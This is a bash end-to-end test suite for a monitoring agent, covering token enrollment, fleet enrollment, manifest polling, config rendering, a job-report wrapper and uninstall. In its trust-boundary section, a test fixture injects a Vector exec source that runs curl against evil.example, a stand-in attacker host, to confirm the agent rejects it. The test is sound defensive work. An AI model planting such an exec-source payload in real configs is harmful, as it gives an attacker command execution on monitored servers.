#!/usr/bin/env bash
# End-to-end tests for the agent payload (ctl, renderer, config poller, job
# reporter) against a stub facade: no systemd, no network, no root —
# everything is redirected via the CV_AGENT_* test overrides. Portable
# across GNU and BSD userlands (runs on Linux CI and macOS dev machines).
set -euo pipefail

REPO_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
CTL="$REPO_DIR/agent/bin/cloudviewer-agent"
POLLER="$REPO_DIR/agent/libexec/fetch-config"
RENDERER="$REPO_DIR/agent/libexec/render-config"
WRAPPER="$REPO_DIR/agent/bin/cloudviewer-report"
GOLDEN_DIR="$REPO_DIR/tests/golden"
TMP="$(mktemp -d)"
SERVER_PID=""
trap '[ -n "$SERVER_PID" ] && kill "$SERVER_PID" 2>/dev/null; rm -rf "$TMP"' EXIT

PASS=0
fail() {
    echo "FAIL: $*" >&2
    exit 1
}
ok() {
    PASS=$((PASS + 1))
    echo "ok: $*"
}

# GNU stat vs BSD stat — the only portability seam the assertions need.
file_mode() { stat -c %a "$1" 2>/dev/null || stat -f %Lp "$1"; }
file_mtime() { stat -c %Y "$1" 2>/dev/null || stat -f %m "$1"; }

# The facade's manifest for a tier, byte-identical to renderAgentManifest
# in the facade (pinned there by TestAgentConfigManifestTiers).
write_manifest() {
    case "$1" in
    free) printf 'manifest_version=1\ntier=free\nships_journald=false\nships_auth_logs=false\n' ;;
    pro) printf 'manifest_version=1\ntier=pro\nships_journald=true\nships_auth_logs=false\n' ;;
    team) printf 'manifest_version=1\ntier=team\nships_journald=true\nships_auth_logs=true\n' ;;
    *) fail "unknown tier $1" ;;
    esac
}

# ---- 0. renderer golden fixtures --------------------------------------------
# The rendered vector.yaml IS the product; pin it per tier so any template
# change is a deliberate, reviewed diff. The redaction VRL inside these
# fixtures is additionally pinned from the facade side
# (TestRedactVRLParity) — the two repos cannot drift without one CI failing.

for tier in free pro team; do
    write_manifest "$tier" >"$TMP/manifest.$tier"
    env CV_AGENT_TOKEN=golden-token CV_AGENT_FACADE_URL=https://api.example.test \
        sh "$RENDERER" "$TMP/manifest.$tier" >"$TMP/rendered.$tier" ||
        fail "renderer failed for $tier"
    diff -u "$GOLDEN_DIR/$tier.yaml" "$TMP/rendered.$tier" ||
        fail "rendered $tier config drifted from tests/golden/$tier.yaml (review the diff; update the golden only deliberately)"
done
grep -q "auth_logs" "$TMP/rendered.pro" && fail "pro must not render auth logs"
grep -q "journald" "$TMP/rendered.free" && fail "free must not render a log pipeline"
grep -q "golden-token" "$TMP/rendered.free" || fail "token must be injected locally into the sink headers"
ok "renderer → golden fixtures match for free/pro/team"

# ---- fixture: stub facade ---------------------------------------------------

write_manifest pro >"$TMP/config.yaml"
mkdir -p "$TMP/downloads"
python3 "$REPO_DIR/tests/stub_server.py" "$TMP/downloads" "$TMP/config.yaml" "$TMP/port" &
SERVER_PID=$!
for _ in $(seq 1 50); do
    [ -s "$TMP/port" ] && break
    sleep 0.1
done
[ -s "$TMP/port" ] || fail "stub server did not start"
PORT="$(cat "$TMP/port")"
FACADE="http://127.0.0.1:$PORT"

# systemctl stub records its invocations
mkdir -p "$TMP/bin"
cat >"$TMP/bin/systemctl" <<EOF
#!/bin/sh
echo "\$@" >>"$TMP/systemctl.log"
EOF
chmod +x "$TMP/bin/systemctl"

ETC="$TMP/etc"
DATA="$TMP/data"
LIBEXEC="$REPO_DIR/agent/libexec"
run_ctl() {
    env CV_AGENT_ETC_DIR="$ETC" \
        CV_AGENT_DATA_DIR="$DATA" \
        CV_AGENT_SYSTEMCTL="$TMP/bin/systemctl" \
        CV_AGENT_LIBEXEC_DIR="$LIBEXEC" \
        sh "$CTL" "$@"
}
run_poller() {
    env CV_AGENT_ETC_DIR="$ETC" CV_AGENT_LIBEXEC_DIR="$LIBEXEC" sh "$POLLER"
}
# run_ctl with the metadata service pointed at $1 (the fleet-enrollment
# identity source; on a real host it is the link-local 169.254.169.254).
run_ctl_fleet() {
    meta="$1"
    shift
    env CV_AGENT_ETC_DIR="$ETC" \
        CV_AGENT_DATA_DIR="$DATA" \
        CV_AGENT_SYSTEMCTL="$TMP/bin/systemctl" \
        CV_AGENT_LIBEXEC_DIR="$LIBEXEC" \
        CV_AGENT_METADATA_URL="$meta" \
        sh "$CTL" "$@"
}
META="$FACADE/metadata/instance-id"

# ---- 1. enroll: unknown token fails fast, writes nothing --------------------

set +e
out="$(run_ctl enroll --token nope --facade-url "$FACADE" 2>&1)"
rc=$?
set -e
[ "$rc" -ne 0 ] || fail "enroll with unknown token should fail"
echo "$out" | grep -q "rejected the agent token" || fail "unexpected unknown-token message: $out"
[ ! -e "$ETC" ] || fail "unknown token must not write anything"
ok "enroll unknown token → clear error, nothing written"

# ---- 2. enroll: revoked token gets its own message --------------------------

set +e
out="$(run_ctl enroll --token revoked-token --facade-url "$FACADE" 2>&1)"
rc=$?
set -e
[ "$rc" -ne 0 ] || fail "enroll with revoked token should fail"
echo "$out" | grep -q "revoked" || fail "unexpected revoked-token message: $out"
ok "enroll revoked token → clear error"

# ---- 3. enroll: happy path (manifest fetched, config rendered locally) ------

run_ctl enroll --token good-token --facade-url "$FACADE" >"$TMP/enroll.out"

[ "$(file_mode "$ETC/agent.env")" = "600" ] || fail "agent.env must be 0600"
[ "$(file_mode "$ETC/vector.yaml")" = "640" ] || fail "vector.yaml must be 0640 (group-readable for the vector user)"
[ "$(file_mode "$ETC/manifest")" = "644" ] || fail "manifest must be cached 0644"
grep -q "CV_AGENT_TOKEN=good-token" "$ETC/agent.env" || fail "token missing from agent.env"
cmp -s "$ETC/manifest" "$TMP/config.yaml" || fail "cached manifest must match the facade's"
# The rendered config: local identity injected, tier gates honored.
grep -q "type: host_metrics" "$ETC/vector.yaml" || fail "rendered config missing host_metrics"
grep -q "uri: $FACADE/v1/ingest/metrics" "$ETC/vector.yaml" || fail "sink must point at the enrolling facade"
grep -q "X-Agent-Token: good-token" "$ETC/vector.yaml" || fail "token must be injected into sink headers"
grep -q "data_dir: $DATA" "$ETC/vector.yaml" || fail "rendered config must pin our data_dir"
grep -q "redact_journald" "$ETC/vector.yaml" || fail "pro tier must render the journald redaction"
grep -q "auth_logs" "$ETC/vector.yaml" && fail "pro tier must not render auth logs"
[ ! -e "$ETC/config.etag" ] || fail "enroll must clear the etag (first poll re-establishes it)"
grep -q "^enable --now cloudviewer-agent.service cloudviewer-agent-config.timer$" "$TMP/systemctl.log" ||
    fail "units not enabled"
grep -q "Connected in the portal" "$TMP/enroll.out" || fail "missing success banner"
ok "enroll → manifest cached, config rendered locally, token injected, units enabled"

# ---- 4. enroll is idempotent and rotates tokens in place --------------------

run_ctl enroll --token rotated-token --facade-url "$FACADE" --quiet >"$TMP/rotate.out"
grep -q "CV_AGENT_TOKEN=rotated-token" "$ETC/agent.env" || fail "re-enroll must replace the token"
grep -q "X-Agent-Token: rotated-token" "$ETC/vector.yaml" || fail "re-enroll must re-render with the new token"
[ ! -s "$TMP/rotate.out" ] || fail "--quiet must suppress the banner"
ok "re-enroll → token rotated in place (agent.env + rendered config), --quiet silent"

# ---- 5. enroll: pre-provisioned agent.env (the declarative path) ------------

rm -rf "$ETC"
mkdir -p "$ETC"
printf 'CV_AGENT_TOKEN=good-token\nCV_AGENT_FACADE_URL=%s\n' "$FACADE" >"$ETC/agent.env"
chmod 600 "$ETC/agent.env"
run_ctl enroll --quiet
grep -q "type: host_metrics" "$ETC/vector.yaml" || fail "pre-provisioned enroll must render the config"
ok "enroll with pre-provisioned agent.env → completes without flags"

# no token anywhere → actionable error
rm -rf "$ETC"
set +e
out="$(run_ctl enroll 2>&1)"
rc=$?
set -e
[ "$rc" -ne 0 ] || fail "enroll without any token should fail"
echo "$out" | grep -q "pre-provision" || fail "missing pre-provision hint: $out"
ok "enroll without token → actionable error"

# ---- 5b. fleet enrollment: happy path (specs/12 §3) -------------------------
# The stub's metadata endpoint answers 4242, which the enroll token's
# project inventory contains → the facade mints per-server "good-token".

: >"$TMP/systemctl.log"
run_ctl_fleet "$META" enroll --enroll-token good-enroll-token --facade-url "$FACADE" >"$TMP/fleet.out"
grep -q "CV_AGENT_TOKEN=good-token" "$ETC/agent.env" || fail "fleet enroll must store the minted per-server token"
# The enrollment token enrolls, it never ingests — and it must never be
# persisted anywhere on the host (specs/12 §9).
grep -rq "good-enroll-token" "$ETC" && fail "the enrollment token must never be written to disk"
grep -q "type: host_metrics" "$ETC/vector.yaml" || fail "fleet enroll must render vector.yaml"
grep -q "X-Agent-Token: good-token" "$ETC/vector.yaml" || fail "rendered config must carry the minted token"
grep -q "^enable --now cloudviewer-agent.service cloudviewer-agent-config.timer$" "$TMP/systemctl.log" ||
    fail "fleet enroll must enable the units"
grep -q "Connected in the portal" "$TMP/fleet.out" || fail "fleet enroll missing success banner"
ok "fleet enroll → minted token stored, enroll token never persisted, config rendered, units enabled"

# ---- 5c. fleet enrollment is a network-free no-op once enrolled -------------
# The converge contract (specs/12 §5): both the metadata URL and the
# facade URL point at a dead port here, so success is only possible if the
# re-run makes no network call at all.

cp "$ETC/agent.env" "$TMP/agent.env.before"
out="$(run_ctl_fleet "http://127.0.0.1:1/instance-id" enroll \
    --enroll-token good-enroll-token --facade-url "http://127.0.0.1:1")"
echo "$out" | grep -q "already enrolled — nothing to do" || fail "re-run must say it is a no-op: $out"
cmp -s "$ETC/agent.env" "$TMP/agent.env.before" || fail "idempotent re-run must not touch agent.env"
ok "fleet enroll re-run → network-free no-op (dead metadata + facade prove it), agent.env untouched"

# ---- 5d. fleet enrollment without a metadata service ------------------------
# Dedicated (Robot) servers have no metadata service — the error must say
# so and point at the per-server path, and nothing may be written.

rm -rf "$ETC"
set +e
out="$(run_ctl_fleet "http://127.0.0.1:1/instance-id" enroll \
    --enroll-token good-enroll-token --facade-url "$FACADE" 2>&1)"
rc=$?
set -e
[ "$rc" -ne 0 ] || fail "fleet enroll without metadata service should fail"
echo "$out" | grep -q "dedicated (Robot) servers" || fail "missing dedicated-server hint: $out"
[ ! -e "$ETC" ] || fail "metadata failure must not write anything"
ok "fleet enroll unreachable metadata → dedicated-server hint, nothing written"

# ---- 5e. fleet enrollment of a foreign instance (cross-tenant) --------------
# Instance 6666 exists, but not in the enroll token's project inventory:
# the facade answers 404 (specs/12 §2 — never trust a self-asserted id),
# which must map to the project hint, not a bare HTTP code.

set +e
out="$(run_ctl_fleet "$FACADE/metadata/instance-id-foreign" enroll \
    --enroll-token good-enroll-token --facade-url "$FACADE" 2>&1)"
rc=$?
set -e
[ "$rc" -ne 0 ] || fail "fleet enroll of a foreign instance should fail"
echo "$out" | grep -q "instance 6666" || fail "error must name the claimed instance: $out"
echo "$out" | grep -q "not in the token's project inventory" || fail "missing project hint: $out"
[ ! -e "$ETC" ] || fail "cross-tenant rejection must not write anything"
ok "fleet enroll cross-tenant instance → project-inventory hint, nothing written"

# ---- 5f. revoked fleet enrollment token -------------------------------------

set +e
out="$(run_ctl_fleet "$META" enroll --enroll-token revoked-enroll-token --facade-url "$FACADE" 2>&1)"
rc=$?
set -e
[ "$rc" -ne 0 ] || fail "revoked enroll token should fail"
echo "$out" | grep -q "revoked or server limit reached" || fail "unexpected revoked-enroll message: $out"
echo "$out" | grep -q "enrollment token revoked" || fail "facade's own wording must be passed through: $out"
[ ! -e "$ETC" ] || fail "revoked enroll token must not write anything"
ok "fleet enroll revoked token → clear error with the facade's wording, nothing written"

# ---- 5g. pre-provisioned CV_AGENT_ENROLL_TOKEN (specs/30 §8.2) --------------
# The declarative fleet shape: cloud-init/config management drops an
# agent.env carrying only the enrollment token, then runs bare `enroll`.
# The final agent.env holds only the minted per-server identity.

mkdir -p "$ETC"
printf 'CV_AGENT_ENROLL_TOKEN=good-enroll-token\nCV_AGENT_FACADE_URL=%s\n' "$FACADE" >"$ETC/agent.env"
chmod 600 "$ETC/agent.env"
run_ctl_fleet "$META" enroll --quiet
grep -q "CV_AGENT_TOKEN=good-token" "$ETC/agent.env" || fail "pre-provisioned fleet enroll must store the minted token"
grep -q "CV_AGENT_ENROLL_TOKEN" "$ETC/agent.env" && fail "the enrollment token must not survive enrollment"
grep -q "X-Agent-Token: good-token" "$ETC/vector.yaml" || fail "pre-provisioned fleet enroll must render the config"
ok "pre-provisioned CV_AGENT_ENROLL_TOKEN + bare enroll → fleet path, minted token only"

# ---- 5h. fleet-enroll helper: the entrypoint's stdout contract --------------
# The container entrypoint consumes the shared helper directly (no ctl in
# the image): the minted token must be EXACTLY the stdout, errors must
# stay on stderr, so a captured "$(fleet-enroll)" is usable verbatim.

minted="$(env CV_AGENT_ENROLL_TOKEN=good-enroll-token CV_AGENT_FACADE_URL="$FACADE" \
    CV_AGENT_METADATA_URL="$META" sh "$REPO_DIR/agent/libexec/fleet-enroll" 2>"$TMP/fleet-helper.err")" ||
    fail "fleet-enroll helper must succeed against the stub"
[ "$minted" = "good-token" ] || fail "helper stdout must be exactly the minted token, got: $minted"
[ ! -s "$TMP/fleet-helper.err" ] || fail "helper success must write nothing to stderr"
ok "fleet-enroll helper → minted token on stdout, silent stderr (entrypoint contract)"

# ---- 6. config poller: 200 → 304 → tier change → re-render ------------------

run_ctl enroll --token good-token --facade-url "$FACADE" --quiet

run_poller
[ -s "$ETC/config.etag" ] || fail "first poll should store the ETag"

# Pin the mtime to a fixed past date: a 304 must not rewrite the file, so
# the mtime has to survive the second poll (portable across stat variants).
touch -t 200001010000 "$ETC/vector.yaml"
run_poller
[ "$(file_mtime "$ETC/vector.yaml")" -lt 1000000000 ] ||
    fail "unchanged manifest must 304 and not rewrite vector.yaml"

# Tier upgrade pro → team: the new manifest re-renders with the auth-log
# pipeline, within one poll.
write_manifest team >"$TMP/config.yaml"
run_poller
grep -q "auth_logs" "$ETC/vector.yaml" || fail "team manifest must render the auth-log pipeline"
grep -q "inputs: \[redact_journald, redact_auth\]" "$ETC/vector.yaml" ||
    fail "team log sink must consume both redaction transforms"
cmp -s "$ETC/manifest" "$TMP/config.yaml" || fail "cached manifest must follow the facade"
[ "$(file_mode "$ETC/vector.yaml")" = "640" ] || fail "refreshed vector.yaml must stay 0640"
ok "config poller → ETag stored, 304 no-op, tier change re-renders within one poll"

# revoked mid-flight: poller keeps the last config and fails visibly
sed "s/CV_AGENT_TOKEN=.*/CV_AGENT_TOKEN=revoked-token/" "$ETC/agent.env" >"$ETC/agent.env.tmp"
mv "$ETC/agent.env.tmp" "$ETC/agent.env"
set +e
out="$(run_poller 2>&1)"
rc=$?
set -e
[ "$rc" -ne 0 ] || fail "poller must exit non-zero on a revoked token"
echo "$out" | grep -q "keeping current config" || fail "poller must say it kept the config"
grep -q "auth_logs" "$ETC/vector.yaml" || fail "revoked token must not clobber the config"
sed "s/CV_AGENT_TOKEN=.*/CV_AGENT_TOKEN=good-token/" "$ETC/agent.env" >"$ETC/agent.env.tmp"
mv "$ETC/agent.env.tmp" "$ETC/agent.env"
ok "config poller with revoked token → last config kept, visible failure"

# ---- 6b. manifest schema is the trust boundary ------------------------------
# A compromised facade is the threat model. Whatever it serves — extra
# keys, unknown versions, or a full vector.yaml with an exec source (the
# pre-manifest attack) — nothing outside the strict schema ever reaches
# vector.yaml: reject, keep the last config, fail visibly.

expect_rejected() {
    reason="$1"
    set +e
    out="$(run_poller 2>&1)"
    rc=$?
    set -e
    [ "$rc" -ne 0 ] || fail "poller must reject: $reason"
    echo "$out" | grep -q "manifest rejected" || fail "missing rejection message for $reason: $out"
    grep -q "auth_logs" "$ETC/vector.yaml" || fail "$reason must not clobber the good config"
    [ ! -f "$ETC/.vector.yaml.tmp" ] || fail "rejected render must not linger on disk"
}

{ write_manifest team; printf 'exec_me=please\n'; } >"$TMP/config.yaml"
expect_rejected "unknown key"
printf 'manifest_version=9\ntier=team\nships_journald=true\nships_auth_logs=true\n' >"$TMP/config.yaml"
expect_rejected "unknown manifest_version"
printf 'sources:\n  pwn:\n    type: exec\n    command: ["curl", "evil.example"]\n' >"$TMP/config.yaml"
expect_rejected "full-config injection (exec source)"

# Same boundary at enrollment: a hostile first manifest refuses to enroll.
rm -rf "$TMP/etc-hostile"
set +e
out="$(env CV_AGENT_ETC_DIR="$TMP/etc-hostile" CV_AGENT_SYSTEMCTL="$TMP/bin/systemctl" \
    CV_AGENT_LIBEXEC_DIR="$LIBEXEC" \
    sh "$CTL" enroll --token good-token --facade-url "$FACADE" 2>&1)"
rc=$?
set -e
[ "$rc" -ne 0 ] || fail "enroll must refuse a hostile manifest"
echo "$out" | grep -q "refusing to enroll" || fail "enroll must explain the refusal: $out"
[ ! -f "$TMP/etc-hostile/vector.yaml" ] || fail "hostile manifest must not produce a config at enroll"

write_manifest team >"$TMP/config.yaml"
ok "manifest schema → unknown keys/versions and config injection rejected at poll and enroll"

# ---- 6c. render: package upgrade re-applies the template offline ------------

printf '# stale render from an older package\n' >"$ETC/vector.yaml"
run_ctl render
grep -q "type: host_metrics" "$ETC/vector.yaml" || fail "render must rebuild vector.yaml from the cached manifest"
grep -q "auth_logs" "$ETC/vector.yaml" || fail "render must honor the cached team manifest"
[ "$(file_mode "$ETC/vector.yaml")" = "640" ] || fail "render must keep 0640"
# Not enrolled under the manifest model → silent no-op (postinstall safety).
rm -rf "$TMP/etc-empty2" && mkdir -p "$TMP/etc-empty2"
env CV_AGENT_ETC_DIR="$TMP/etc-empty2" CV_AGENT_SYSTEMCTL="$TMP/bin/systemctl" \
    CV_AGENT_LIBEXEC_DIR="$LIBEXEC" sh "$CTL" render || fail "render without a manifest must no-op"
ok "render → offline re-render from cached manifest, no-op when unenrolled"

# ---- 7. status --------------------------------------------------------------

out="$(run_ctl status)"
echo "$out" | grep -q "^enrolled$" || fail "status must report enrolled"
echo "$out" | grep -q "facade:   $FACADE" || fail "status must show the facade URL"

rm -rf "$TMP/etc-empty"
set +e
out="$(env CV_AGENT_ETC_DIR="$TMP/etc-empty" CV_AGENT_SYSTEMCTL="$TMP/bin/systemctl" sh "$CTL" status)"
rc=$?
set -e
[ "$rc" = "3" ] || fail "status when unenrolled must exit 3, got $rc"
echo "$out" | grep -q "not enrolled" || fail "status must say not enrolled"
ok "status → enrolled details / not-enrolled exit 3"

# ---- 8. cloudviewer-report wrapper ------------------------------------------

env CV_AGENT_ETC_DIR="$ETC" sh "$WRAPPER" --job backup-s3 --max-age 26h -- true ||
    fail "wrapper must propagate the wrapped command's exit 0"
grep -q '"job_name":"backup-s3"' "$TMP/job-reports.log" || fail "wrapper did not report the job"
grep -q '"exit_code":0' "$TMP/job-reports.log" || fail "wrapper reported wrong exit code"
grep -q '"max_age_seconds":93600' "$TMP/job-reports.log" || fail "wrapper did not convert 26h to 93600s"

set +e
env CV_AGENT_ETC_DIR="$ETC" sh "$WRAPPER" --job flaky -- sh -c 'exit 3'
wrapper_ec=$?
set -e
[ "$wrapper_ec" = "3" ] || fail "wrapper must propagate exit 3, got $wrapper_ec"
grep -q '"job_name":"flaky","exit_code":3' "$TMP/job-reports.log" || fail "failure not reported"

# An unreachable facade must never fail the wrapped job.
set +e
env CV_AGENT_ETC_DIR="$ETC" CV_AGENT_TOKEN=good-token CV_AGENT_FACADE_URL=http://127.0.0.1:1 \
    sh "$WRAPPER" --job offline -- true
wrapper_ec=$?
set -e
[ "$wrapper_ec" = "0" ] || fail "unreachable facade must not fail the job, got $wrapper_ec"

# Token problems must NEVER kill the wrapped job — the job runs first,
# token resolution is best-effort afterwards.
BROKEN_ETC="$TMP/broken-etc"
mkdir -p "$BROKEN_ETC"
printf '# no keys here\n' >"$BROKEN_ETC/agent.env"
set +e
out="$(env CV_AGENT_ETC_DIR="$BROKEN_ETC" sh "$WRAPPER" --job orphan -- sh -c 'echo JOB_RAN; exit 4' 2>&1)"
wrapper_ec=$?
set -e
echo "$out" | grep -q JOB_RAN || fail "broken agent.env: the job must still run"
[ "$wrapper_ec" = "4" ] || fail "broken agent.env: want job's exit 4, got $wrapper_ec"
echo "$out" | grep -q "job ran, not reported" || fail "broken agent.env: must say it could not report"
chmod 000 "$BROKEN_ETC/agent.env"
set +e
out="$(env CV_AGENT_ETC_DIR="$BROKEN_ETC" sh "$WRAPPER" --job orphan -- sh -c 'echo JOB_RAN; exit 0' 2>&1)"
wrapper_ec=$?
set -e
chmod 600 "$BROKEN_ETC/agent.env"
echo "$out" | grep -q JOB_RAN || fail "unreadable agent.env: the job must still run"
[ "$wrapper_ec" = "0" ] || fail "unreadable agent.env: want job's exit 0, got $wrapper_ec"
ok "cloudviewer-report → reports, propagates exit codes, never kills the job"

# ---- 9. uninstall: deregisters, removes runtime state, hints at purge -------

uninstall_out="$(run_ctl uninstall)"
[ ! -e "$ETC" ] || fail "uninstall left the config dir"
[ ! -e "$DATA" ] || fail "uninstall left the data dir"
grep -q "^disable --now cloudviewer-agent.service cloudviewer-agent-config.timer$" "$TMP/systemctl.log" ||
    fail "units not disabled on uninstall"
grep -q "^good-token$" "$TMP/deregister.log" 2>/dev/null ||
    fail "uninstall did not deregister with the agent token"
echo "$uninstall_out" | grep -q "deregistered" || fail "uninstall output must confirm deregistration"
echo "$uninstall_out" | grep -q "apt purge cloudviewer-agent" || fail "uninstall must hint at package removal"
ok "uninstall → units disabled, state removed, server deregistered, purge hint"

# ---- 10. uninstall survives an unreachable facade ---------------------------

run_ctl enroll --token good-token --facade-url "$FACADE" --quiet
sed "s#^CV_AGENT_FACADE_URL=.*#CV_AGENT_FACADE_URL=http://127.0.0.1:1#" \
    "$ETC/agent.env" >"$TMP/agent.env.tmp"
cat "$TMP/agent.env.tmp" >"$ETC/agent.env"
uninstall_out="$(run_ctl uninstall)"
[ ! -e "$ETC" ] || fail "uninstall with dead facade left the config dir"
echo "$uninstall_out" | grep -q "could not be confirmed" ||
    fail "uninstall must say when deregistration could not be confirmed"
ok "uninstall with unreachable facade → still removes everything, honest message"

echo
echo "all $PASS agent tests passed"
